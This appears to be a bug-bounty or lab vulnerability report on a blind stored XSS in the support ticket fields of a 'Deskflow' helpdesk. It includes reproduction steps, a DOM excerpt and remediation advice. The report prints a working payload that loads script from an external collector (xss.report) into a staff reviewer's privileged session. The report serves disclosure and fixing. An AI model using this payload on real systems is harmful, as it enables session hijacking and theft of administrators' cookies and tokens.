## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Support Request Fields on Deskflow Staff Dashboard.

## Affected URL

https://deskflow.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the support request submission handler of the Deskflow platform. User-supplied input submitted through ticket fields (such as Subject, Your name, and Description) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping.

When a staff member or administrator reviews submitted support tickets within the staff dashboard, the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the reviewer's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application support submission interface: `https://deskflow.pwnedbox.site/request.php`.
2. Locate the support request form and inject JavaScript payloads into input fields (e.g., entering `'"&><script src="https://xss.report/c/vansh"></script>` into the Subject, Name, and Description fields).
3. Submit the support request form.
4. Log into the staff/admin control panel where stored conversation requests are reviewed (`https://deskflow.pwnedbox.site/staff/` inbox/detail view).
5. Observe that the stored payload executes in the DOM of the staff dashboard, firing requests to the external collector (`xss.report`).

## POC
<img width="1533" height="984" alt="image" src="https://github.com/user-attachments/assets/44dc4a36-f12a-430a-a658-3fa2189d8131" />

<img width="956" height="525" alt="image" src="https://github.com/user-attachments/assets/c3ebe65d-494a-42f7-8280-7ffe6cc73ba7" />

### Vulnerable DOM Snippet

```html
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>'"&gt;&lt;scriPt src=[https://xss.report/c/vansh&gt;&lt;/scriPt&gt](https://xss.report/c/vansh&gt;&lt;/scriPt&gt);</title>
    <link rel="stylesheet" href="../assets/style.css">
  </head>
  <body class="staff">
    <aside class="staffside">
      <a class="logo" href="../index.php"><span>desk</span>flow</a>
      <a class="sideactive" href="index.php">Inbox</a>
      <a href="articles.php">Knowledge base</a>
      <a href="../index.php">View portal</a>
      <a href="logout.php">Sign out</a>
    </aside>
    <main class="staffmain detailstaff">
      <a class="back" href="index.php">← Inbox</a>
      <div class="split">
        <section class="conversation">
          <small>DF-3075E696</small>
          <h1>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></h1>
          <div class="person">
            <div class="initial">'</div>
            <div>
              <b>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></b>
              <span>asd@gmail.com · Account</span>
            </div>
          </div>
          <div class="msg">
            <p>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></p>
            <small>Nov 9, 2026 02:18</small>
          </div>
        </section>
        <aside class="ticketpanel">
          <small>UPDATE TICKET</small>
          <form method="post" action="update.php">
            <input type="hidden" name="csrf" value="145015c71ce9a14960dfd339d5d0f65c2994fd42cc45cfd5">
            <input type="hidden" name="id" value="5">
            <label>Status
              <select name="status">
                <option selected="">open</option>
                <option>pending</option>
                <option>solved</option>
                <option>closed</option>
              </select>
            </label>
            <label>Priority
              <select name="priority">
                <option>low</option>
                <option selected="">normal</option>
                <option>high</option>
                <option>urgent</option>
              </select>
            </label>
            <label>Reply to customer
              <textarea name="reply" rows="8" placeholder="Write a helpful response..."></textarea>
            </label>
            <button>Save &amp; update</button>
          </form>
        </aside>
      </div>
    </main>
  </body>
</html>
```
## Impact
Execution of arbitrary JavaScript code within the high-privilege session of a staff member or administrator reviewing stored customer tickets.

Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of ticket statuses or desk data.

Persistent code execution affecting backend conversation queues and support agent review panels.

## Remediation
Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in staff tables, dashboards, or ticket detail views.

Apply strict input validation and sanitization policies on all support request submission endpoints (Subject, Name, Description fields) to reject or neutralize HTML markup and script tags.

Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
